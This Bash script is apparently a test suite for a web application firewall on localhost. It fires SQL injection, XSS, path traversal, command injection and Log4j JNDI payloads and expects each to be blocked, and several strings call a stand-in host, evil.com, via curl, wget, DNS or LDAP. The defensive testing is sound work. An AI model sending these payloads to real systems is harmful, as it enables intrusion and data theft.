#!/bin/bash

# Configuration
TARGET_URL='http://localhost:8080'
TIMEOUT=2
CURL_TIMEOUT=2 # New curl timeout
OUTPUT_FILE="waf_test_results.log"

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to test a URL and check the response code
test_url() {
    local url="$1"
    local description="$2"
    local expected_code="$3"
    local headers="$4"

    local curl_cmd="curl -s -k -w '%{http_code}' --connect-timeout $TIMEOUT --max-time $CURL_TIMEOUT"

    # Add headers to curl command
     if [ -n "$headers" ]; then
      IFS=';' read -ra header_pairs <<< "$headers"
      for pair in "${header_pairs[@]}"; do
          IFS='=' read -r key value <<< "$pair"
          if [[ -n "$key" && -n "$value" ]]; then
              curl_cmd+=" -H \"$(printf '%s' "$key" | sed 's/[^[:print:]]//g'): $(printf '%s' "$value" | sed 's/[^[:print:]]//g')\""
          fi
       done
    else
        # Default headers for normal requests
        curl_cmd+=" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'"
        curl_cmd+=" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'"
    fi
    # Add output redirection to curl command
    curl_cmd+=" -o /dev/null"

    # Execute curl command
    response=$(eval "$curl_cmd '$url'" 2>/dev/null)
    if [ -z "$response" ]; then
       printf "${RED}[✗]${NC} %-60s [No Response]\n" "$description"
       echo "[FAIL] $description - URL: $url, Headers: \"$headers\", Expected: $expected_code, Got: No Response (Timeout)" >> "$OUTPUT_FILE"
       return 1
    fi
    if [ "$response" = "$expected_code" ]; then
        printf "${GREEN}[✓]${NC} %-60s [%d]\n" "$description" "$response"
        echo "[PASS] $description - URL: $url, Headers: \"$headers\", Expected: $expected_code, Got: $response" >> "$OUTPUT_FILE"
        return 0
    else
        printf "${RED}[✗]${NC} %-60s [%d]\n" "$description" "$response"
         echo "[FAIL] $description - URL: $url, Headers: \"$headers\", Expected: $expected_code, Got: $response" >> "$OUTPUT_FILE"
        return 1
    fi
}

declare -a test_cases=(
    # New Improved SQL Injection tests
    "$TARGET_URL/?q=1;%20SELECT%20@@version;--"        "SQL Injection - SQL Server Version"         403     ""
    "$TARGET_URL/?q=1;%20WAITFOR%20DELAY%20'00:00:05';--"   "SQL Injection - SQL Server Time Delay"      403     ""
    "$TARGET_URL/?q=1;%20dbms_lock.sleep(5);--"       "SQL Injection - Oracle Time Delay"           403     ""
    "$TARGET_URL/?q=1%20or%201=1--"  "SQL Injection - Error Based 1"   403 ""
    "$TARGET_URL/?q=1%22%20or%201=1%22--" "SQL Injection - Error Based 2"   403 ""
    "$TARGET_URL/?q=1%27%20or%201=1%27--"  "SQL Injection - Error Based 3"   403 ""
    "$TARGET_URL/?q=SELECT+USER()"  "SQL Injection - MySQL user"   403 ""
    "$TARGET_URL/?q=current_user"   "SQL Injection - PostgreSQL user"   403 ""
    "$TARGET_URL/?q=sElEcT+*%20fRoM+users"   "SQL Injection - Case Variation"   403 ""
    "$TARGET_URL/?q=SELECT%09*%0aFROM%0dusers"   "SQL Injection - Whitespace Variation"   403 ""
    "$TARGET_URL/?q=SELECT/*test*/+*+FROM+users"    "SQL Injection - Obfuscation Variation"   403 ""
    "$TARGET_URL/?q=1%u0027%20OR%201%3D1%23"    "SQL Injection - Unicode Variation"  403 ""
    "$TARGET_URL/?q=1%252527%20OR%201=1"    "SQL Injection - Triple URL Encoded Variation"  403 ""
    "$TARGET_URL/?q=SELECT%20LOAD_FILE(CONCAT('\\\\',(SELECT%20user()),'.evil.com\\\\a'))"     "SQL Injection - OOB DNS Lookup" 403 ""
    "$TARGET_URL/?q=SELECT%20UTL_INADDR.GET_HOST_ADDRESS('evil.com')%20FROM%20DUAL"   "SQL Injection - Oracle OOB DNS Lookup"   403 ""
    "$TARGET_URL/"                                      "SQL Injection - Header - Basic Select"  403     "X-Custom-SQL-Header=SELECT * FROM users"
    "$TARGET_URL/"                                      "SQL Injection - Cookie - Basic Select" 403    "Cookie=sql_query=SELECT * FROM users;"
    # Example of testing an injection in a header and also with a JSON body
    "$TARGET_URL/" "SQL Injection - Header - Basic Select" 403 ""
    "$TARGET_URL" "SQL Injection - JSON body " 403 ""

    # XSS Tests
    "$TARGET_URL/?x=<script>alert(1)</script>"           "XSS - Basic Script Tag"              403     ""
    "$TARGET_URL/?x=<img%20src=x%20onerror=alert(1)>"    "XSS - IMG Onerror"                   403     ""
    "$TARGET_URL/?x=javascript:alert(1)"                "XSS - JavaScript Protocol"            403     ""
    "$TARGET_URL/?x=<svg/onload=alert(1)>"               "XSS - SVG Onload"                     403     ""
    "$TARGET_URL/?x=<a%20href=javascript:alert(1)>Click</a>" "XSS - Anchor Tag JavaScript"      403     ""
    "$TARGET_URL/?x=%3Cscript%3Ealert(1)%3C/script%3E"   "XSS - URL Encoded Script"              403     ""
    "$TARGET_URL/?x=%253Cscript%253Ealert(1)%253C%252Fscript%253E" "XSS - Double URL Encoded"  403 ""
    "$TARGET_URL/?x=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" "XSS - URL Encoded IMG"             403     ""
    "$TARGET_URL/?x=<body%20onload=alert(1)>"        "XSS - Body Onload"                   403     ""
    "$TARGET_URL/?x=<input%20onfocus=alert(1)%20autofocus>"  "XSS - Input Onfocus Autofocus"       403     ""
    "$TARGET_URL/?x=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E" "XSS - Breaking Out of Attribute"  403     ""
    "$TARGET_URL/?x=<script>alert(1)</script>"  "XSS - HTML Encoded"              403     ""
    "$TARGET_URL/?x=<iframe%20srcdoc=%22<script>alert(1)</script>%22></iframe>"  "XSS - IFRAME srcdoc" 403     ""
    "$TARGET_URL/?x=<details%20open%20onload=alert(1)>"  "XSS - Details Tag"                   403     ""
    "$TARGET_URL/?x=--%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E" "XSS - HTML Comment Breakout"       403     ""
    # Path Traversal Tests
    "$TARGET_URL/../../etc/passwd"                      "Path Traversal - Basic"                 403     ""
    "$TARGET_URL/....//....//etc/passwd"                "Path Traversal - Double Dot"            403     ""
    "$TARGET_URL/.../....//etc/passwd"                  "Path Traversal - Triple Dot"            403     ""
    "$TARGET_URL/..%2F..%2Fetc%2Fpasswd"                "Path Traversal - URL Encoded"           403     ""
    "$TARGET_URL/..%252F..%252Fetc%252Fpasswd"          "Path Traversal - Double URL Encoded"   403     ""
    "$TARGET_URL/....\/....\/etc\/passwd"              "Path Traversal - Mixed Slashes"       403     ""
    "$TARGET_URL/..%c0%af..%c0%afetc%c0%afpasswd"        "Path Traversal - UTF-8 Encoded"          403     ""
    "$TARGET_URL/....%2Fetc%2Fpasswd"               "Path Traversal - Encoded and Literal"    403     ""
    "$TARGET_URL/..%2e%2fetc%2fpasswd"                 "Path Traversal - Mixed Encoding"        403     ""
    "$TARGET_URL//etc//passwd"                        "Path Traversal - Multiple Slashes"       403     ""
    # RCE Tests
    "$TARGET_URL/?cmd=cat%20/etc/passwd"                "RCE - Basic Command"                   403     ""
    "$TARGET_URL/?cmd=base64%20/etc/passwd"             "RCE - Base64 Command"                  403     ""
    "$TARGET_URL/?cmd=%60whoami%60"                     "RCE - Backticks"                       403     ""
    "$TARGET_URL/?cmd=ls%20-la"                         "RCE - List Files"                     403     ""
    "$TARGET_URL/?cmd=uname%20-a"                      "RCE - Uname"                           403     ""
    "$TARGET_URL/?cmd=id"                              "RCE - ID"                             403     ""
    "$TARGET_URL/?cmd=whoami"                         "RCE - whoami Command"                   403     ""
    "$TARGET_URL/?cmd=echo%20test"                      "RCE - Echo Test"                      403     ""
    "$TARGET_URL/?cmd=%77%68%6f%61%6d%69"            "RCE - Hex Encoded Command"              403     ""
    "$TARGET_URL/?cmd=curl%20evil.com"                "RCE - Curl Request"                     403     ""
    "$TARGET_URL/?cmd=wget%20evil.com"                  "RCE - Wget Request"                    403     ""
    "$TARGET_URL/?cmd=ping%20-c%201%20evil.com"         "RCE - Ping"                             403     ""
    "$TARGET_URL/?cmd=powershell%20Get-Process"       "RCE - PowerShell Command"             403     ""

    # Log4j Tests
    "$TARGET_URL/?x=\${jndi:ldap://evil.com/x}"        "Log4j - JNDI LDAP"                     403     ""
    "$TARGET_URL/?x=\${env:SHELL}"                      "Log4j - Environment"                   403     ""
    "$TARGET_URL/?x=\${jndi:rmi://evil.com/x}"        "Log4j - JNDI RMI"                      403     ""
    "$TARGET_URL/?x=\${sys:os.name}"                    "Log4j - System Property"              403     ""
    "$TARGET_URL/?x=\${lower:TEST}"                    "Log4j - Lowercase"                   403     ""
    "$TARGET_URL/?x=\${upper:test}"                    "Log4j - Uppercase"                    403     ""
    "$TARGET_URL/?x=\${date:yyyy-MM-dd}"               "Log4j - Date"                          403     ""
    "$TARGET_URL/?x=\${base64:SGVsbG8=}"                "Log4j - Base64"                        403     ""
    "$TARGET_URL/?x=\${::-jndi:ldap://evil.com/x}"     "Log4j - Partial Lookup"                403     ""
    "$TARGET_URL/?x=\${jndi%3aldap%3a%2f%2fevil.com%2fx}"  "Log4j - URL Encoded"             403     ""

   # HTTP Header Tests
    "$TARGET_URL/"                                      "Header - SQL Injection"              403     "X-Forwarded-For=1' OR '1'='1;User-Agent=Mozilla/5.0"
    "$TARGET_URL/"                                      "Header - XSS Cookie"                 403     "Cookie=<script>alert(1)</script>;User-Agent=Mozilla/5.0"
    "$TARGET_URL/"                                      "Header - Path Traversal"             403     "Referer=../../etc/passwd;User-Agent=Mozilla/5.0"
    "$TARGET_URL/"                                      "Header - Custom X-Attack"            403     "X-Custom-Header=1' UNION SELECT NULL--"
    "$TARGET_URL/"                                     "Header -  X-Forwarded-Host"          403     "X-Forwarded-Host=malicious.domain;User-Agent=Mozilla/5.0"
    "$TARGET_URL/"                                     "Header - User-Agent SQL"            403     "User-Agent=sqlmap/1.7-dev; Accept=1' OR '1'='1"
    "$TARGET_URL/"                                     "Header -  Host Spoof"          403     "Host=malicious.domain;User-Agent=Mozilla/5.0"
    "$TARGET_URL/"                                     "Header -  Accept-Language"          403     "Accept-Language=../../etc/passwd;User-Agent=Mozilla/5.0"

    # Protocol Tests
    "$TARGET_URL/.git/HEAD"                             "Protocol - Git Access"               403     ""
    "$TARGET_URL/.env"                                  "Protocol - Env File"                 403     ""
    "$TARGET_URL/.htaccess"                             "Protocol - htaccess"                403     ""
    "$TARGET_URL/web.config"                           "Protocol - Web.config Access"          403 ""
    "$TARGET_URL/WEB-INF/web.xml"                    "Protocol - Java Web Descriptor"      403  ""
    "$TARGET_URL/.svn/entries"                        "Protocol - SVN Access"            403 ""
    "$TARGET_URL/robots.txt"                          "Protocol - Robots.txt"              403 ""
    "$TARGET_URL/.vscode/settings.json"              "Protocol - VS Code Settings"       403 ""
    "$TARGET_URL/config.php"                        "Protocol - config.php Access"    403 ""
    "$TARGET_URL/server-status"                          "Protocol - Apache Server Status"    403     ""

    # Valid Requests
    "$TARGET_URL/"                                      "Valid - Homepage"                   200     ""
    "$TARGET_URL/api/"                             "Valid - API Endpoint"               200     ""

   # Scanner Detection
    "$TARGET_URL/"                                      "Scanner - SQLMap"                     403     "User-Agent=sqlmap/1.7-dev;Accept=*/*"
    "$TARGET_URL/"                                      "Scanner - Acunetix"                 403     "User-Agent=acunetix-wvs;Accept=*/*"
    "$TARGET_URL/"                                      "Scanner - Nikto"                    403     "User-Agent=Nikto/2.1.5;Accept=*/*"
    "$TARGET_URL/"                                      "Scanner - Nmap"                     403     "User-Agent=Mozilla/5.0 Nmap;Accept=*/*"
    "$TARGET_URL/"                                      "Scanner - Dirbuster"                403     "User-Agent=DirBuster-1.0-RC1;Accept=*/*"
    "$TARGET_URL/health"                                "Valid - Health Check"               200     "User-Agent=HealthCheck/1.0;Accept=*/*"
    "$TARGET_URL/"                                      "Valid - Chrome Browser"             200     "User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    "$TARGET_URL/"                                  "Scanner -  Burp Suite"            403     "User-Agent=Mozilla/5.0 (compatible; BurpSuite/2023.10.1)"
    "$TARGET_URL/"                                  "Scanner - OWASP ZAP"            403     "User-Agent=OWASP ZAP/2.12.0"
    "$TARGET_URL/"                                  "Scanner - Nessus"            403     "User-Agent=Nessus/10.7.0;Accept=*/*"
    "$TARGET_URL/"                                  "Scanner - Qualys"           403     "User-Agent=QualysAgent/1.0;Accept=*/*"
    "$TARGET_URL/"                                  "Scanner -  Wfuzz"            403    "User-Agent=Wfuzz/2.4.2"
    "$TARGET_URL/"                                  "Scanner -  OpenVAS"            403     "User-Agent=OpenVAS"

)

main() {
    # Clear previous results
    > "$OUTPUT_FILE"

    echo -e "${BLUE}WAF Security Test Suite${NC}"
    echo -e "${BLUE}Target: ${NC}$TARGET_URL"
    echo -e "${BLUE}Date: ${NC}$(date)"
    echo "----------------------------------------"

    local total_tests=0
    local passed=0
    local failed=0
    local previous_type="" # Initialize previous_type here

    # Calculate total number of tests
    total_tests=$(( ${#test_cases[@]} / 4 ))

    # Run tests
    local test_type=""
    for ((i=0; i<${#test_cases[@]}; i+=4)); do
        # Extract the test type from the test description
        test_type=$(echo "${test_cases[i+1]}" | cut -d' ' -f1)
         if test_url "${test_cases[i]}" "${test_cases[i+1]}" "${test_cases[i+2]}" "${test_cases[i+3]}"; then
           ((passed++))
        else
            ((failed++))
        fi
         # Print a newline when the test type changes (for better readability)
        if [[ "$previous_type" != "$test_type" ]] && [[ "$previous_type" != "" ]]; then
             echo ""
        fi
        previous_type="$test_type"
    done

    echo "----------------------------------------"
    echo -e "${BLUE}Results Summary${NC}"
    echo -e "Total Tests: $total_tests"
    echo -e "Passed: ${GREEN}$passed${NC}"
    echo -e "Failed: ${RED}$failed${NC}"

    if [[ $total_tests -gt 0 ]]; then
        local pass_percentage=$(echo "scale=2; 100 * $passed / $total_tests" | bc)
        # replace the , with a . and use printf with %f format to print the percentage
        local pass_percentage_int=$(echo "$pass_percentage" | sed 's/,/./g'  | awk '{printf "%.0f\n",$1}')
        echo -e "Pass Percentage: ${GREEN}$pass_percentage_int%${NC}"
         if [[ "$pass_percentage_int" -lt "90" ]]; then
          echo -e "${RED}Warning:  Test pass percentage is below 90%. Review the failures!${NC}"
        fi
    fi
    echo -e "\nDetailed results saved to: $OUTPUT_FILE"
}

main
